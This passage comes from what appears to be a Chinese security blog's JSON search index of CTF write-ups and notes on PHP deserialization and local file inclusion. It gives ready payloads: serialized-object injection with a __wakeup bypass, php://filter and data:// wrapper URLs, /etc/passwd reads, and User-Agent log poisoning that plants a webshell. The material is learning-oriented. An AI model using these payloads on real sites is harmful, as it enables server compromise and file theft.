即可绕过__wakeup","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(php伪协议/反序列化)[ZJCTF 2019]NiZhuanSiWei","slug":"php伪协议-反序列化-ZJCTF-2019-NiZhuanSiWei","date":"2023-01-07T08:53:48.000Z","updated":"2023-01-07T08:57:32.467Z","comments":true,"path":"2023/01/07/php伪协议-反序列化-ZJCTF-2019-NiZhuanSiWei/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/","excerpt":"&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;","text":"&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt; 第一步if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))这个判断告诉我们要将text内写入welcome to the zjctf payload: ?text=data:text/plain,welcome to the zjctf 第二步if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125; file参数里不能出现flag字符，我们看到提示“useless.php ”，先包含它看一下。（因为是php文件，我们想看到内容就需要php://filter伪协议） payload： ?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php base64解码 &lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 这里定义了Flag类，里面有__tostring魔术方法，这个魔术方法是在类被当成字符串的时候调用，然后获取file的值并输出。而且这里也提醒了我们flag.php。 第三步$password = unserialize($password);echo $password; 那么现在我们就包含useless.php文件，后面对$password进行了反序列化，我们让$password反序列化出Flag类，因为$password被当做字符串输出，所以会调用__tostring魔术方法，然后会输出file的内容。那么我们就构造反序列化的值 &lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $a = new Flag();echo serialize($a);?&gt; 这样也行 最终payload /?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(引用赋值构造序列化)BUU CODE REVIEW","slug":"引用赋值构造序列化-BUU-CODE-REVIEW","date":"2023-01-07T08:49:18.000Z","updated":"2023-01-07T08:52:27.543Z","comments":true,"path":"2023/01/07/引用赋值构造序列化-BUU-CODE-REVIEW/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/","excerpt":"","text":"&lt;?php/** \\* Created by PhpStorm. \\* User: jinzhao \\* Date: 2019/10/6 \\* Time: 8:04 PM */highlight_file(__FILE__); //高亮显示当前页面源码class BUU &#123; //类：BUU public $correct = &quot;&quot;; //公有属性：$correct public $input = &quot;&quot;; //公有属性：$input public function __destruct() &#123; //公有析构方法__destruct()，在当前类的实例化对象销毁前，自动被调用 try &#123; $this-&gt;correct = base64_encode(uniqid()); //给correct赋值为base64_encode(uniqid()) if($this-&gt;correct === $this-&gt;input) &#123; //判断两个属性是否全等 echo file_get_contents(&quot;/flag&quot;); //若全等，则打印根目录下的flag &#125; &#125; catch (Exception $e) &#123; &#125; &#125;&#125;if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123; //判断pleaseget===&#x27;1&#x27;&amp;&amp;pleasepost===&#x27;2&#x27;&amp;&amp;md1!=md52&amp;&amp;md5(md51)==md5(md52) if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123; if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123; unserialize($_POST[&#x27;obj&#x27;]); &#125; &#125;&#125; 思路 GET提交：?pleaseget=1 POST提交的第一部分：pleasepost=2&amp;md51[]=1&amp;md52[]=2 POST提交的第二部分：一个BUU类的实例化对象，且两个属性值在经过$this-&gt;correct = base64_encode(uniqid());这个之后，依然全等，那么这里我们可以把变化的$correct属性的引用赋值给属性$input //uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。 //传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。 //引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。 构造序列化 &lt;?phpclass BUU &#123; public $correct = &quot;&quot;; public $input = &quot;&quot;; public function __destruct() &#123; try &#123; $this-&gt;correct = base64_encode(uniqid()); if($this-&gt;correct === $this-&gt;input) &#123; echo file_get_contents(&quot;/flag&quot;); &#125; &#125; catch (Exception $e) &#123; &#125; &#125;&#125;$aa = new BUU();$aa-&gt;input=&amp;$aa-&gt;correct;$aaa = serialize($aa);print_r($aaa); $aa-&gt;input=&amp;$aa-&gt;correct; 这一行代码是引用赋值 payload GET部分：?pleaseget=1 POST部分：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(private私有反序列化)[极客大挑战 2019]PHP","slug":"private私有反序列化-极客大挑战-2019-PHP","date":"2023-01-07T08:39:37.000Z","updated":"2023-01-07T08:48:42.137Z","comments":true,"path":"2023/01/07/private私有反序列化-极客大挑战-2019-PHP/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/","excerpt":"","text":"给了提示：备份网站 扫目录得到www.zip &lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;;​ public function __construct($username,$password)&#123;​ $this-&gt;username = $username;​ $this-&gt;password = $password;​ &#125;​ function __wakeup()&#123;​ $this-&gt;username = &#x27;guest&#x27;;​ &#125;​ function __destruct()&#123;​ if ($this-&gt;password != 100) &#123;​ echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;​ echo &quot;You name is: &quot;;​ echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;​ echo &quot;You password is: &quot;;​ echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;​ die();​ &#125;​ if ($this-&gt;username === &#x27;admin&#x27;) &#123;​ global $flag;​ echo $flag;​ &#125;else&#123;​ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;​ die();​ ​ &#125;​ &#125;&#125;?&gt; &lt;?php$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;?&gt; 上面三个php文件，其中flag.php没有用，纯粹迷惑你。 看index.php中间的几行代码 &lt;?php​ include &#x27;class.php&#x27;;​ $select = $_GET[&#x27;select&#x27;];​ $res=unserialize(@$select);​ ?&gt; 这里是包含了class.php，并且get传参select，将传入的内容反序列化 所以我们要将闯入的内容序列化 看class.php 在这段代码的__destruct()方法中，发现了输出flag的代码，并且，执行条件是password==100，username===‘admin’。 接下来，就有考虑如何调用__destruct()方法了，这就用到了index.php中的反序列操作。 可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用__destruct()方法。 当时这里用个问题，就是在执行__destruct()方法之前，可能会先执行wakeup()方法，并且在**wakeup()**会修改username的值。 因此，这里应该绕过wakeup()方法，避免wakeup()执行。 这里存在一个CVE漏洞：当成员属性数目大于实际数目时可绕过wakeup方法 （1）通过php脚本，将serialize($a)函数序列化的结果输出。脚本生成php序列化对象参考代码如下： &lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;;​ public function __construct($username,$password)&#123;​ $this-&gt;username = $username;​ $this-&gt;password = $password;​ &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a));?&gt; 另外，private 声明的字段在序列化时，需要注意： private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。 因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下 O:4:”User”:2:{s:9:”%00User%00age”;i:20;s:10:”%00User%00name”;s:4:”daye”;} # 9=7+2 10=8+2 其中2为两个前缀 (2)也可以直接构造 最后序列化结果为 O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;} 其中的3是为了绕过_wakeup()魔法函数将2改成了3 最后payload ?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"easy_md5(复现)","slug":"easy-md5-复现","date":"2023-01-07T08:35:49.000Z","updated":"2023-01-07T08:38:33.126Z","comments":true,"path":"2023/01/07/easy-md5-复现/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"啥也没有，看一下数据包 提示了 hint: select * from ‘admin’ where password=md5($pass,true) 首先看一下md5($pass,true)这个函数 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 这种。 ​ 比如’ffifdyop‘字符串对应的16位原始二进制的字符串就是” ‘or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c “ 。 ‘ \\ ‘后面的3个字符连同’ \\ ‘算一个字符，比如’ \\xc9 ‘，所以上述一共16个。当然，像’ \\xc9 ‘这种字符会显示乱码。 为true时 当为false时 true时 &#x27;or&#x27;6?]??!r,??b\u001c #16位原始2进制字符串 false 276f722736c95d99e921722cf9ed621c #32位16进制字符串 所以false中的每两位16进制化为的10进制数对应true中的一位 比如 27 对应 ‘ 6f 对应 o 所以我们要构造一个md5值中带有 xxx’or’xxxxxx 的字符 这样就可以闭合 select * from ‘admin’ where password= ‘xxx’or’1xxxxx’ (or后面的数字1~9都行) 原因如下： 所以我们需要的字符串的原始二进制格式的字符串里要包含 ‘or’ ，如果根据原始二进制来找到我们要的字符串可能会比较麻烦，那么可以根据32位16进制的字符串来查找，根据上面介绍的， ‘or’ 对应的16进制是 276f7227 ，所以我们的目标就是要找一个字符串取32位16进制的md5值里带有276f7227这个字段的，接着就是要看关键的数字部分了，在276f7227这个字段后面紧跟一个数字，除了0，1-9，对应的asc码值是49-57，转化为16进制就是31-39，也就是我们需要有276f7227+（31-39）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（31-39）xxxxxx 输入ffifdyop 看源码 因为md5函数不能解析数组，导致函数返回Null。而Null是等于Null的，导致了绕过。看下面的示例，是返回了yes的。（题目中就传入 ?a[]=1&amp;b[]=2 ） 构造?a[]=1&amp;b[]=2 接着构造 param1[]=1&amp;param2[]=2 得到flag： NSSCTF{fb498f88-84ad-4543-8225-dc7536c24cf6}","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(目录穿越)HNCTF中的一道题","slug":"目录穿越-HNCTF中的一道题","date":"2023-01-07T08:34:29.000Z","updated":"2023-01-07T08:35:20.021Z","comments":true,"path":"2023/01/07/目录穿越-HNCTF中的一道题/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/","excerpt":"[WEEK2]easy_include ​ 这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。 注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。 再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。","text":"[WEEK2]easy_include ​ 这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。 注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。 再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。 构造payload： ?file=/etc/passwd 可以访问内网文件 nginx的日志文件为/var/log/nginx/access.log 构造UA头一句话木马","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(data伪协议利用)[SWPUCTF 2021 新生赛]PseudoProtocols","slug":"data伪协议利用-SWPUCTF-2021-新生赛-PseudoProtocols","date":"2023-01-07T08:29:41.000Z","updated":"2023-01-07T08:31:22.627Z","comments":true,"path":"2023/01/07/data伪协议利用-SWPUCTF-2021-新生赛-PseudoProtocols/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/","excerpt":"","text":"利用filter伪协议读取hint.php文件 分析代码 ini_set(“max_execution_time”, “180”);通过“ini_set(“max_execution_time”,”180”);”增加脚本执行时间。 if(isset($a)&amp;&amp;(file_get_contents($a,’r’)) === ‘I want flag’) //a参数利用file_get_contents()函数只读形式打开，打开后内容要与”I want flag”字符串相匹配，才能执行下面的文件包含$file参数。 看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议。 构造?a=data://text/plain;base64,SSB3YW50IGZsYWc= 。得到flag。","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"php伪协议","slug":"php伪协议","date":"2023-01-07T08:27:46.000Z","updated":"2023-01-07T08:29:09.373Z","comments":true,"path":"2023/01/07/php伪协议/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"https://www.cnblogs.com/zzjdbk/p/13030717.html php://input可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。用法：?file=php://input 数据利用POST传过去 php://input （读取POST数据）碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项； 通过input获取webshell写入一句话木马","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"php中四个可文件包含的函数","slug":"php中四个可文件包含的函数","date":"2023-01-07T08:26:23.000Z","updated":"2023-01-07T08:27:07.398Z","comments":true,"path":"2023/01/07/php中四个可文件包含的函数/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/php%E4%B8%AD%E5%9B%9B%E4%B8%AA%E5%8F%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0/","excerpt":"一、文件包含漏洞分类LFI(Local File Inclusion)本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。为了方便本文把LFI直接称为文件包含漏洞。","text":"一、文件包含漏洞分类LFI(Local File Inclusion)本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。为了方便本文把LFI直接称为文件包含漏洞。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置 allow_url_fopen = On allow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 二、文件包含漏洞原理本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。 这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。如若攻击者能够通过其他方式在Web服务器上放置代码，那么他们便可以执行任意命令 Directory traversal attack is also called a Local File Inclusion or LFI. 翻译：目录遍历攻击也称为本地文件包含攻击或LFI。 三、文件包含函数PHP中文件包含函数有以下四种： require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行 require_once() // 如果一个文件已经被包含过，则不会在包含它 include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行 include_once() // 如果一个文件已经被包含过，则不会在包含它 include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 这四个函数可以将任意类型的文件当做 PHP 文件进行解析。示例代码： 例如： $_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[‘filename’]的值，执行非预期的操作。 四、测试是否存在本地文件包含（LFI）漏洞使用 …/ 上一级目录测试： ?page=../ 会返回以下错误： Warning: include(C:\\Users\\Administrator\\Documents\\php): failed to open stream: Permission denied in C:\\Users\\Administrator\\Documents\\php\\LFI\\LFI_base.php on line 10 这意味着很有可能存在 LFI 漏洞 使用 常见 页面 ?page=index.html 若是返回 index.html 页面，也就意味着存在 LFI 漏洞 直接读取 /etc/passwd 文件(Linux)： ?page=/etc/passwd 若是出现了 passwd 数据，那证明此网站容易受到本地文件包含的影响","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(UA头文件包含)ctfshow 80 日志文件包含","slug":"UA头文件包含-ctfshow-80-日志文件包含","date":"2023-01-07T08:22:22.000Z","updated":"2023-01-07T08:25:45.183Z","comments":true,"path":"2023/01/07/UA头文件包含-ctfshow-80-日志文件包含/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/UA%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow-80-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"&lt;?php/*\\# -*- coding: utf-8 -*-\\# @Author: h1xa\\# @Date: 2020-09-16 11:25:09\\# @Last Modified by: h1xa\\# @Last Modified time: 2020-09-16 11:26:29\\# @email: h1xa@ctfer.com\\# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125;","text":"&lt;?php/*\\# -*- coding: utf-8 -*-\\# @Author: h1xa\\# @Date: 2020-09-16 11:25:09\\# @Last Modified by: h1xa\\# @Last Modified time: 2020-09-16 11:26:29\\# @email: h1xa@ctfer.com\\# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 经验证，无法使用伪协议绕过 试一下日志文件包含 直接访问 ?file=/var/log/nginx/access.log 发现user-agent能写入shellUser-Agent: 直接连接蚁剑拿到flag 知识点 访问日志文件记录了服务器收到的每一次请求的 IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号无法包含其中，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。 访问日志的位置和文件名在不同的系统上会有所差异 apache一般是/var/log/apache/access.log nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件包含常用函数","slug":"文件包含常用函数","date":"2023-01-07T08:21:10.000Z","updated":"2023-01-07T08:21:55.412Z","comments":true,"path":"2023/01/07/文件包含常用函数/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/","excerpt":"include() require() fopen() include_once() require_once() readfile()","text":"include() require() fopen() include_once() require_once() readfile() include()与require()区别当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。 include_once()与require_once()区别当之前包含过一个文件时，就不会再包含了 fopen()与readfile()","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"本地文件包含与远程文件包含","slug":"本地文件包含与远程文件包含","date":"2023-01-07T08:18:49.000Z","updated":"2023-01-07T08:19:41.832Z","comments":true,"path":"2023/01/07/本地文件包含与远程文件包含/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"1.本地文件包含漏洞 本地文件包含（LFI）漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web服务器将特定文件当成php执行，从而导致用户可获取一定的服务器权限。","text":"1.本地文件包含漏洞 本地文件包含（LFI）漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web服务器将特定文件当成php执行，从而导致用户可获取一定的服务器权限。 注意事项(1）两个文件在同一目录下 (2）若不在同一目录，包含的文件路径必须写相对路径或绝对路径 (3）被包含的页面的后缀无论是什么都会当作php解析 2.远程文件包含漏洞远程文件包含漏洞（RFI)，它其实也属于”代码注入”的一种,其原理就是注入一段用户能控制的脚本或代码，并让其在服务端执行。 前提条件(1) allow_url_fopen ON(默认ON) (2) allow_url_include ON (默认OFF) (3）被包含的变量前没有目录的限制 注意事项(1）远程包含文件路径必须为绝对路径 (2）被包含的文件不能够被服务器解析，如php文件","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"windows与linux敏感文件","slug":"windows与linux敏感文件","date":"2023-01-07T08:17:18.000Z","updated":"2023-01-07T08:18:10.674Z","comments":true,"path":"2023/01/07/windows与linux敏感文件/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/","excerpt":"","text":"","categories":[{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）","slug":"指定后缀文件包含（-php后缀）与-指定前缀文件包含（files）","date":"2023-01-07T08:15:18.000Z","updated":"2023-01-07T08:16:48.745Z","comments":true,"path":"2023/01/07/指定后缀文件包含（-php后缀）与-指定前缀文件包含（files）/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/","excerpt":"","text":"熊海cms文件包含漏洞(指定前缀files/) 漏洞分析两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的 由于用了 addslashes函数所以不能用%00截断来绕过.php后缀 可以用………（256个.） 